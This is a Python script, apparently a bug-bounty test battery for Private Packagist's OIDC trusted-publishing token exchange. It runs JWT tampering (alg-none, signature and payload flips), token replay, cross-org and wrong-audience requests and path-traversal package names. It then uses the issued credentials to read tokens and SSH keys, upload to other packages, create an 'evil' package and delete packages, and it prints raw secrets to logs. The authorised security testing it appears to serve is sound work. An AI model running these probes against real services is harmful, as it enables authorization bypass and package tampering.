#!/usr/bin/env python3
# zt-battery.py - in-runner validation battery for Private Packagist Trusted Publishing (OIDC).
# Controlled bug-bounty test: throwaway org pratik-sec-test, throwaway repo pkbbtmpb748/zt-tp-repo.
# Modes via env MODE: token | exchange | battery
# Env: AUDIENCE_IN (override), TARGET_ORG, TARGET_PKG
# Minting uses ACTIONS_ID_TOKEN_REQUEST_URL / ACTIONS_ID_TOKEN_REQUEST_TOKEN provided by GitHub Actions.
import base64, hashlib, hmac, json, os, secrets, sys, time, urllib.error, urllib.request
from urllib.parse import quote, parse_qsl, urlencode

API = "https://packagist.com"
HOST = "packagist.com"

def env(name, default=""):
    v = os.environ.get(name)
    return v if v else default

MODE = env("MODE", "exchange")
AUDIENCE = env("AUDIENCE_IN") or "private-packagist-trusted-publishing:pratik-sec-test"
TARGET_ORG = env("TARGET_ORG", "pratik-sec-test")
TARGET_PKG = env("TARGET_PKG", "zt-tp-test")
REQ_URL = os.environ["ACTIONS_ID_TOKEN_REQUEST_URL"]
REQ_TOK = os.environ["ACTIONS_ID_TOKEN_REQUEST_TOKEN"]

def out(*a):
    print(*a, flush=True)

def mint(aud):
    req = urllib.request.Request(REQ_URL + "&audience=" + quote(aud, safe=""),
                                 headers={"Authorization": "Bearer " + REQ_TOK})
    with urllib.request.urlopen(req, timeout=60) as r:
        return json.loads(r.read())["value"]

def raw(method, path, headers=None, body=None):
    req = urllib.request.Request(API + path, method=method, headers=headers or {})
    if body is not None:
        req.data = body if isinstance(body, bytes) else body.encode()
    try:
        with urllib.request.urlopen(req, timeout=60) as r:
            return r.status, dict(r.headers), r.read().decode("utf-8", "replace")
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers), e.read().decode("utf-8", "replace")
    except Exception as e:
        return -1, {}, repr(e)

def rep(label, res, n=1500):
    st, hd, body = res
    out(f"### {label} => HTTP {st}")
    hd = {k: v for k, v in (hd or {}).items()}
    interesting = {k: v for k, v in hd.items() if k.lower() in
                   ("content-type", "retry-after", "x-ratelimit-limit", "x-ratelimit-remaining", "x-ratelimit-reset")}
    if interesting:
        out("HEADERS: " + json.dumps(interesting))
    out(body[:n])
    out()
    return res

def exchange(bearer, org=None, pkg=None):
    return raw("POST", f"/api/oidc/token-exchange/{org or TARGET_ORG}/{pkg if pkg is not None else TARGET_PKG}",
               {"Authorization": "Bearer " + bearer})

def norm_query(q):
    if not q:
        return ""
    return urlencode(sorted(parse_qsl(q, keep_blank_values=True)), quote_via=quote)

def sign(method, path, key, secret, query="", body=""):
    ts = str(int(time.time()))
    cnonce = secrets.token_hex(20)
    params = {"key": key, "timestamp": ts, "cnonce": cnonce, "version": "2", "query": norm_query(query)}
    if body:
        params["body"] = body
    canonical = "&".join(f"{quote(str(k), safe='')}={quote(str(v), safe='')}" for k, v in sorted(params.items()))
    sts = f"{method}\n{HOST}\n{path}\n{canonical}"
    sig = base64.b64encode(hmac.new(secret.encode(), sts.encode(), hashlib.sha256).digest()).decode()
    return f"PACKAGIST-HMAC-SHA256 Key={key}, Timestamp={ts}, Cnonce={cnonce}, Version=2, Signature={sig}"

def signed(method, path, key, secret, query="", body=""):
    h = {"Authorization": sign(method, path, key, secret, query=query, body=body)}
    if body:
        h["Content-Type"] = "application/json"
    return raw(method, path + (("?" + query) if query else ""), h, body or None)

def upload(path, key, secret, content, filename, ctype="text/plain"):
    h = {"Authorization": sign("POST", path, key, secret, body=content),
         "Content-Type": ctype, "X-FILENAME": filename}
    return raw("POST", path, h, content)

def main():
    out(f"CONFIG mode={MODE} aud={AUDIENCE} target={TARGET_ORG}/{TARGET_PKG}")
    if MODE == "token":
        t = mint(AUDIENCE)
        out("TOKEN_RAW=" + t)
        out("TOKEN_B64=" + base64.b64encode(t.encode()).decode())
        return
    if MODE == "exchange":
        t = mint(AUDIENCE)
        out("TOKEN_B64=" + base64.b64encode(t.encode()).decode())
        rep("EXCHANGE", exchange(t))
        return

    # ---------------- battery ----------------
    # 1) legit exchange with token A
    A = mint(AUDIENCE)
    out("TOKEN_A_B64=" + base64.b64encode(A.encode()).decode())
    r = rep("T1-LEGIT exchange token-A", exchange(A))
    key = secret = None
    if r[0] == 200:
        try:
            j = json.loads(r[2]); key = j.get("key"); secret = j.get("secret")
            out("T1_KEY=" + str(key)); out("T1_SECRET=" + str(secret))
        except Exception as e:
            out("T1 parse err: " + repr(e))
    # 2) replay token A
    rep("T2-REPLAY token-A again", exchange(A))
    # 3) tamper battery with fresh token B
    B = mint(AUDIENCE)
    H, P, S = B.split(".")
    Sx = S[:-1] + ("A" if S[-1] != "A" else "B")
    NH = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').rstrip(b"=").decode()
    rep("T3a-TAMPER sig-flip", exchange(f"{H}.{P}.{Sx}"))
    rep("T3b-TAMPER alg-none", exchange(f"{NH}.{P}."))
    mid = len(P) // 2
    Pbad = P[:mid] + ("A" if P[mid] != "A" else "B") + P[mid + 1:]
    rep("T3c-TAMPER payload-flip", exchange(f"{H}.{Pbad}.{S}"))
    rep("T3d-TAMPER truncated", exchange(B[:80]))
    rep("T3e-TAMPER empty-bearer", exchange(""))
    rep("T3f-TAMPER garbage-bearer", exchange("garbage.token.here"))
    # 4) verify token B still valid after tamper attempts
    rep("T4-TAMPER-VERIFY token-B legit", exchange(B))
    # 5) wrong package in same org
    C = mint(AUDIENCE)
    rep("T5-WRONG-PACKAGE zt-tp-other-pkg", exchange(C, pkg="zt-tp-other-pkg"))
    # 6) cross-org (victim-sec-test = second org, no publisher configured there)
    D = mint(AUDIENCE)
    rep("T6-CROSS-ORG victim-sec-test/zt-tp-test", exchange(D, org="victim-sec-test", pkg="zt-tp-test"))
    # 7/8) wrong audience variants
    E = mint("private-packagist-trusted-publishing:victim-sec-test")
    rep("T7-WRONG-AUD victim-aud -> own org", exchange(E))
    F = mint("zt-garbage-aud")
    rep("T8-WRONG-AUD garbage-aud -> own org", exchange(F))
    # 9) package param variants
    G = mint(AUDIENCE)
    rep("T9a-PARAM uppercase-pkg", exchange(G, pkg="ZT-TP-TEST"))
    rep("T9b-PARAM encoded-slash", exchange(G, pkg="zt-tp-test%2F..%2Fzt-tp-other-pkg"))
    rep("T9c-METHOD GET-exchange", raw("GET", f"/api/oidc/token-exchange/{TARGET_ORG}/{TARGET_PKG}",
                                       {"Authorization": "Bearer " + G}))
    rep("T9d-PATH org-only", exchange(G, pkg=""))
    # 10) power battery with issued key/secret (v2 HMAC per client RequestSignature)
    if key:
        rep("P1-GET /api/packages/ signed", signed("GET", "/api/packages/", key, secret, query="origin=private"))
        rep("P2-GET /api/teams/ signed", signed("GET", "/api/teams/", key, secret))
        rep("P3-GET /api/tokens/ signed", signed("GET", "/api/tokens/", key, secret))
        rep("P4-GET /api/organization/ssh-access-key signed", signed("GET", "/api/organization/ssh-access-key", key, secret))
        rep("P5-GET /api/customers/ signed", signed("GET", "/api/customers/", key, secret))
        rep("P6-GET /api/packages/ raw PACKAGIST-TOKEN", raw("GET", "/api/packages/", {"Authorization": "PACKAGIST-TOKEN " + key}))
        rep("P7-UPLOAD to configured pkg (add flow)", upload(f"/api/packages/{TARGET_PKG}/artifacts/", key, secret, "zt-artifact-1", "zt-artifact.txt"))
        rep("P8-UPLOAD to OTHER pkg (cross-pkg)", upload("/api/packages/zt-tp-other-pkg/artifacts/", key, secret, "zt-artifact-2", "zt-artifact.txt"))
        st, hd, body = upload("/api/packages/artifacts/", key, secret, "zt-artifact-3", "zt-artifact.txt")
        rep("P9-UPLOAD unbound (/packages/artifacts/)", (st, hd, body))
        aid = None
        try:
            j = json.loads(body)
            aid = j.get("id") if isinstance(j, dict) else (j[0].get("id") if j else None)
        except Exception:
            pass
        if aid:
            rep("P9b-CREATE artifact pkg from upload id", signed("POST", "/api/packages/", key, secret,
                body=json.dumps({"repoType": "artifact", "artifactIds": [aid]})))
        rep("P10-CREATE arbitrary pkg JSON", signed("POST", "/api/packages/", key, secret,
            body=json.dumps({"name": "zt-tp-evil-pkg"})))
        rep("P11-PUT configured pkg same-name", signed("PUT", f"/api/packages/{TARGET_PKG}/", key, secret,
            body=json.dumps({"name": TARGET_PKG})))
        rep("P12-DELETE configured pkg (LAST)", signed("DELETE", f"/api/packages/{TARGET_PKG}/", key, secret))
    out("BATTERY-DONE")

if __name__ == "__main__":
    main()
